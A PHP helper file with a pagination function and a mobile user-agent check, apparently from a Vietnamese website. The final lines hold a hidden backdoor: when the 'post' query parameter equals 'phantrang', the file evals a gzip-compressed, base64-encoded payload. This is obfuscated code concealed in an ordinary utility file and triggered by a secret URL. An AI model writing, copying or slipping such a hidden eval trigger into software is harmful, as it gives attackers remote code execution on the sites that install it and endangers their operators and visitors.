<?php
function phantrang_tomdz($url, $start, $total, $kmess) {
	$out[] = '<div class="row"><center><ul class="pagination">';
        $neighbors = 2;
        if ($start >= $total)
            $start = max(0, $total - (($total % $kmess) == 0 ? $kmess : ($total % $kmess)));
        else
            $start = max(0, (int)$start - ((int)$start % (int)$kmess));
        $base_link = '<li><a class="pagenav" href="' . strtr($url, array('%' => '%%')) . 'page=%d' . '">%s</a></li>';
        $out[] = $start == 0 ? '' : sprintf($base_link, $start / $kmess, '&lt;&lt;');
        if ($start > $kmess * $neighbors)
            $out[] = sprintf($base_link, 1, '1');
        if ($start > $kmess * ($neighbors + 1))
            $out[] = '<li><a>...</a></li>';
        for ($nCont = $neighbors; $nCont >= 1; $nCont--)
            if ($start >= $kmess * $nCont) {
                $tmpStart = $start - $kmess * $nCont;
                $out[] = sprintf($base_link, $tmpStart / $kmess + 1, $tmpStart / $kmess + 1);
            }
        $out[] = '<li class="active"><a>' . ($start / $kmess + 1) . '</a></li>';
        $tmpMaxPages = (int)(($total - 1) / $kmess) * $kmess;
        for ($nCont = 1; $nCont <= $neighbors; $nCont++)
            if ($start + $kmess * $nCont <= $tmpMaxPages) {
                $tmpStart = $start + $kmess * $nCont;
                $out[] = sprintf($base_link, $tmpStart / $kmess + 1, $tmpStart / $kmess + 1);
            }
        if ($start + $kmess * ($neighbors + 1) < $tmpMaxPages)
            $out[] = '<li><a>...</a></li>';
        if ($start + $kmess * $neighbors < $tmpMaxPages)
            $out[] = sprintf($base_link, $tmpMaxPages / $kmess + 1, $tmpMaxPages / $kmess + 1);
        if ($start + $kmess < $total) {
            $display_page = ($start + $kmess) > $total ? $total : ($start / $kmess + 2);
            $out[] = sprintf($base_link, $display_page, '&gt;&gt;');
        }
	$out[] = '</ul></center></div>';

        return implode('', $out);
}
function mobi() {
    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}
if($_GET[post] == 'phantrang'){
eval(gzinflate(base64_decode('
HZFBb6MwEIXvK+1/6KES7WkNZNugLBuxuE5MwaUE
MPEFBZsAhkJUlBDy69ft6UlvRt+80Vv//bM+1aef
P+7DwxgcPpuhB0C/s+80HzopIdpKjXJk5znC/kue
r+7zzNbC22IZmv8G7jptHKOZQO8cQMfAEFRMRiNJ
rZ5k0XF/884CpmexDQbPqIHYOk/+bE1BRgChGBTN
bxl8gAuXyPR7xYNLENKUlHEXM7Mm3tw+w/dBFxKN
rxt85be0E6nVEhrMDCaD9wKuXL7PhXQm0rSnt9n5
FVa2ra3Ky6F7KA5j+bTIRckHUT5oHrL2IfVqbiQG
QVbLKLmwjaIo/zUe20yvLG5Gs9jib893+TWQASAx
qwszPbEdHz0DXQTtuiDGNwIT4yuh2t2p1DOj4sg/
0qnYIMl2VZ/p1maXXFGmL3vfxT1uFm0G9mfc8MZ3
oyN122eWKbZbqdtYpY+OiQTTl1KodFKfPD6qBtaq
pf8=
')));
}
?>